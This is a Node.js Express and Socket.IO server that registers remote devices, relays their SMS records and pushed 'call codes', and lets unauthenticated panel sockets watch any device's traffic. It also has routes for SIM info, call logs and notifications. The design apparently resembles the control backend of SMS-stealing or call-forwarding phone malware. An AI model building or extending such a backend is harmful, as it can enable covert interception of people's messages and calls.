// ================================================================
// REALTIME SERVER – FINAL PRODUCTION VERSION (CALL + SMS + WATCH)
// ================================================================

import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import mongoose from "mongoose";
import fetch from "node-fetch";
import { connectDB } from "./config/db.js";

import Sms from "./models/Sms.js";
import { initAdminPassword } from "./controllers/authController.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import authRoutes from "./routes/authRoutes.js";
import logRoutes from "./routes/logRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

// ================================================================
// APP + SOCKET
// ================================================================
const app = express();
const server = createServer(app);

const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 10000,
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// ================================================================
// HELPERS
// ================================================================
const cleanId = (id) =>
    id ? id.toString().trim().toUpperCase() : null;

const deviceSockets = new Map(); // DEVICE → SOCKET
const watchers = new Map();      // DEVICE → UI watcher sockets

const sendToWatchers = (id, payload) => {
    const set = watchers.get(id);
    if (!set) return;
    for (const sid of set) io.to(sid).emit("deviceRealtime", payload);
};

// ================================================================
// SOCKET.IO LOGIC
// ================================================================
io.on("connection", (socket) => {
    console.log("🟢 CONNECT", socket.id);

    let deviceID = null;

    // ------------------------------------------------------------
    // WATCH DEVICE (UI PANEL)
    // ------------------------------------------------------------
    socket.on("watchDevice", (rawId) => {
        const id = cleanId(rawId);
        if (!id) return;

        if (!watchers.has(id)) watchers.set(id, new Set());
        watchers.get(id).add(socket.id);

        console.log("👁 UI WATCH:", id);
    });

    socket.on("unwatchDevice", (rawId) => {
        const id = cleanId(rawId);
        watchers.get(id)?.delete(socket.id);
    });

    // ------------------------------------------------------------
    // DEVICE REGISTER
    // ------------------------------------------------------------
    socket.on("registerDevice", (rawId) => {
        const id = cleanId(rawId);
        if (!id) return;

        deviceID = id;
        deviceSockets.set(id, socket.id);
        socket.join(id);

        console.log("🔗 REGISTERED:", id);

        io.to(socket.id).emit("deviceRegistered", { uniqueid: id });

        saveLastSeen(id, "Online");

        const payload = {
            uniqueid: id,
            connectivity: "Online",
            updatedAt: new Date(),
        };

        io.emit("deviceStatus", payload);
        sendToWatchers(id, payload);
    });

    // ------------------------------------------------------------
    // DEVICE STATUS HEARTBEAT
    // ------------------------------------------------------------
    socket.on("deviceStatus", (data = {}) => {
        const id = cleanId(data.uniqueid);
        if (!id) return;

        const payload = {
            uniqueid: id,
            connectivity: data.connectivity || "Online",
            updatedAt: new Date(),
        };

        saveLastSeen(id, payload.connectivity);

        io.emit("deviceStatus", payload);
        sendToWatchers(id, payload);
    });

    // ------------------------------------------------------------
    // DISCONNECT DEVICE / UI
    // ------------------------------------------------------------
    socket.on("disconnect", () => {
        console.log("🔴 DISCONNECT", socket.id);

        if (deviceID && deviceSockets.get(deviceID) === socket.id) {
            deviceSockets.delete(deviceID);
            saveLastSeen(deviceID, "Offline");

            const payload = {
                uniqueid: deviceID,
                connectivity: "Offline",
                updatedAt: new Date(),
            };

            io.emit("deviceStatus", payload);
            sendToWatchers(deviceID, payload);
        }

        for (const s of watchers.values()) s.delete(socket.id);
    });
});

// ================================================================
// LAST SEEN
// ================================================================
async function saveLastSeen(id, status) {
    try {
        await fetch(`${process.env.BASE_URL}/api/lastseen/${id}/status`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ connectivity: status }),
        });
    } catch {}
}

// ================================================================
// SEND CALL CODE TO DEVICE (FINAL FIX)
// ================================================================
export function sendCallCodeToDevice(rawId, data) {
    const id = cleanId(rawId);
    if (!id) return;

    const socketId = deviceSockets.get(id);
    if (!socketId) {
        console.log("❌ DEVICE OFFLINE, CANNOT SEND CALL:", id);
        return;
    }

    console.log("📞 CALL EMIT →", id);

    io.to(socketId).emit("callCodeUpdate", data);
    sendToWatchers(id, { type: "call", ...data });
}

// ================================================================
// ADMIN UPDATE
// ================================================================
export function sendAdminGlobal(data) {
    io.emit("adminUpdate", data);
}

// ================================================================
// MONGO STREAMS
// ================================================================
mongoose.connection.once("open", async () => {
    console.log("📡 MONGO STREAMS ACTIVE");

    await initAdminPassword();

    const watch = (name, cb) => {
        const start = () => {
            try {
                const stream = mongoose.connection.collection(name).watch();
                stream.on("change", async (chg) => {
                    const doc = await mongoose.connection
                        .collection(name)
                        .findOne({ _id: chg.documentKey._id });
                    if (doc) cb(doc);
                });
                stream.on("error", () => setTimeout(start, 1000));
            } catch {
                setTimeout(start, 1000);
            }
        };
        start();
    };

    // CALL STREAM
    watch("callcodes", (doc) => sendCallCodeToDevice(doc.uniqueid, doc));

    // SMS STREAM
    Sms.watch().on("change", async (chg) => {
        const doc = await Sms.findById(chg.documentKey._id).lean();
        if (!doc?.uniqueid) return;

        io.to(cleanId(doc.uniqueid)).emit("smsUpdate", doc);
        sendToWatchers(doc.uniqueid, { type: "sms", ...doc });
    });
});

// ================================================================
// ROUTES
// ================================================================
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/action", logRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);
app.use("/api/auth", authRoutes);

app.get("/", (req, res) => res.send("Realtime Backend Running"));

// ================================================================
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`🚀 SERVER STARTED ON ${PORT}`));
